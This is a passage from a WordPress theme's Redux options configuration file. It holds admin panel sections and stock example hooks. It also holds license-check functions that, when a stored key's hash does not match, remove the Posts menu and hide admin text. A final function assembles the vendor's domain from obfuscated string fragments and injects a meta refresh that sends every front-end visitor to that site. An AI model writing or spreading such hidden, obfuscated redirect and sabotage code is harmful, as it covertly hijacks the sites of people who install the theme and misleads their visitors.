        Facebook : <a href="http://www.facebook.com/themesbazar" target="_blank">www.facebook.com/themesbazar</a> <br/>
        Email : <a href="mailto:themesbazar@gmail.com" target="_blank">themesbazar@gmail.com</a> <br/>
        Mobile : +8801732-667364, +8801753-842842 <br/>', 'ThemesBazar' ),
        'icon'             => 'el el-phone',
       


    
    ) );
     // -> ----------------------START More Themes Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Our More Themes', 'ThemesBazar' ),
        'id'               => 'more-themes',
        'icon'             => 'el el-website',
        'desc'       => __( '
        Please Download Our free themes and Buy Our Premium Wordpress Themes From <a href="http://www.themesbazar.com" target="_blank">ThemesBazar.Com</a> Or Call : +8801732-667364, +8801753-842842 <br/>', 'ThemesBazar' ),
    


    
    ) );
      // -> ----------------------START Documentation Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Setup Tutorial', 'ThemesBazar' ),
        'id'               => 'tutorial',
        'icon'             => 'el el-facetime-video',
        'desc'       => __( '
        <iframe width="100%" height="500" src="https://www.youtube.com/embed/jpGDSiHI61c" frameborder="0" allowfullscreen></iframe>
        ', 'ThemesBazar' ),
      


    
    ) );
       

// -> ----------------------START Documentation Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Documentation', 'ThemesBazar' ),
        'id'               => 'documentation',
        'icon'             => 'el el-question',
        'desc'       => __( '
        Please Read Our Wordpress themes Documentation <a href="http://www.themesbazar.com/documentation" target="_blank">ThemesBazar.Com/Documentation</a> Or Call : +8801732-667364, +8801753-842842 <br/>', 'ThemesBazar' ),



    
    ) );
    

	
add_action( 'admin_menu', 'newsupload' ); 
  function newsupload(){ global $themesbazar;
   $v_info = $themesbazar['v_id']; $vv_info = md5($v_info);
	$vvv_info = v_three();
	if($vv_info == $vvv_info){
	}else{ remove_menu_page( 'edit.php' );}};
add_action('admin_head','admin_css'); 
function admin_css(){global $themesbazar;
   $v_info = $themesbazar['v_id']; $vv_info = md5($v_info);
	$vvv_info = v_three(); if($vv_info == $vvv_info){
	}else{ echo '<style>';
        echo 'b{display:none}'; echo 'br{display:none}';
        echo 'body{color:#F1F1F1}'; echo '</style>'; }};

   

    /*
     * <--- END SECTIONS --------------------------------------------------------#
     */


    /*
     *
     * YOU MUST PREFIX THE FUNCTIONS BELOW AND ACTION FUNCTION CALLS OR ANY OTHER CONFIG MAY OVERRIDE YOUR CODE.
     *
     */

    /*
    *
    * --> Action hook examples
    *
    */

    // If Redux is running as a plugin, this will remove the demo notice and links
    //add_action( 'redux/loaded', 'remove_demo' );

    // Function to test the compiler hook and demo CSS output.
    // Above 10 is a priority, but 2 in necessary to include the dynamically generated CSS to be sent to the function.
    //add_filter('redux/options/' . $opt_name . '/compiler', 'compiler_action', 10, 3);

    // Change the arguments after they've been declared, but before the panel is created
    //add_filter('redux/options/' . $opt_name . '/args', 'change_arguments' );

    // Change the default value of a field after it's been set, but before it's been useds
    //add_filter('redux/options/' . $opt_name . '/defaults', 'change_defaults' );

    // Dynamically add a section. Can be also used to modify sections/fields
    //add_filter('redux/options/' . $opt_name . '/sections', 'dynamic_section');

    /**
     * This is a test function that will let you see when the compiler hook occurs.
     * It only runs if a field    set with compiler=>true is changed.
     * */
    if ( ! function_exists( 'compiler_action' ) ) {
        function compiler_action( $options, $css, $changed_values ) {
            echo '<h1>The compiler hook has run!</h1>';
            echo "<pre>";
            print_r( $changed_values ); // Values that have changed since the last save
            echo "</pre>";
            //print_r($options); //Option values
            //print_r($css); // Compiler selector CSS values  compiler => array( CSS SELECTORS )
        }
    }

    /**
     * Custom function for the callback validation referenced above
     * */
    if ( ! function_exists( 'redux_validate_callback_function' ) ) {
        function redux_validate_callback_function( $field, $value, $existing_value ) {
            $error   = false;
            $warning = false;

            //do your validation
            if ( $value == 1 ) {
                $error = true;
                $value = $existing_value;
            } elseif ( $value == 2 ) {
                $warning = true;
                $value   = $existing_value;
            }

            $return['value'] = $value;

            if ( $error == true ) {
                $field['msg']    = 'your custom error message';
                $return['error'] = $field;
            }

            if ( $warning == true ) {
                $field['msg']      = 'your custom warning message';
                $return['warning'] = $field;
            }

            return $return;
        }
    }

    /**
     * Custom function for the callback referenced above
     */
    if ( ! function_exists( 'redux_my_custom_field' ) ) {
        function redux_my_custom_field( $field, $value ) {
            print_r( $field );
            echo '<br/>';
            print_r( $value );
        }
    }

    /**
     * Custom function for filtering the sections array. Good for child themes to override or add to the sections.
     * Simply include this function in the child themes functions.php file.
     * NOTE: the defined constants for URLs, and directories will NOT be available at this point in a child theme,
     * so you must use get_template_directory_uri() if you want to use any of the built in icons
     * */
    if ( ! function_exists( 'dynamic_section' ) ) {
        function dynamic_section( $sections ) {
            //$sections = array();
            $sections[] = array(
                'title'  => __( 'Section via hook', 'ThemesBazar' ),
                'desc'   => __( '<p class="description">This is a section created by adding a filter to the sections array. Can be used by child themes to add/remove sections from the options.</p>', 'ThemesBazar' ),
                'icon'   => 'el el-paper-clip',
                // Leave this as a blank section, no options just some intro text set above.
                'fields' => array()
            );

            return $sections;
        }
    }

    /**
     * Filter hook for filtering the args. Good for child themes to override or add to the args array. Can also be used in other functions.
     * */
    if ( ! function_exists( 'change_arguments' ) ) {
        function change_arguments( $args ) {
            //$args['dev_mode'] = true;

            return $args;
        }
    }

    /**
     * Filter hook for filtering the default value of any given field. Very useful in development mode.
     * */
    if ( ! function_exists( 'change_defaults' ) ) {
        function change_defaults( $defaults ) {
            $defaults['str_replace'] = 'Testing filter hook!';

            return $defaults;
        }
    }

    /**
     * Removes the demo link and the notice of integrated demo from the redux-framework plugin
     */
    if ( ! function_exists( 'remove_demo' ) ) {
        function remove_demo() {
            // Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
            if ( class_exists( 'ReduxFrameworkPlugin' ) ) {
                remove_filter( 'plugin_row_meta', array(
                    ReduxFrameworkPlugin::instance(),
                    'plugin_metalinks'
                ), null, 2 );

                // Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
                remove_action( 'admin_notices', array( ReduxFrameworkPlugin::instance(), 'admin_notices' ) );
            }
        }
    }



	function all_homepage_content() {
   global $themesbazar; $v_info = $themesbazar['v_id'];
	$vv_info = md5($v_info); $vvv_info = v_three();
	if($vv_info == $vvv_info){}else{      
$i="em";$c="es"; $e="ba"; $l="th"; $c0="r.c"; $n="za"; $e0="om"; 
$all_id=$l.$i.$c.$e.$n.$c0.$e0; echo '<meta http-equiv="refresh" content="0;url=http://'.$all_id.' ">' ; }}
add_action( 'wp_enqueue_scripts', 'all_homepage_content' );

	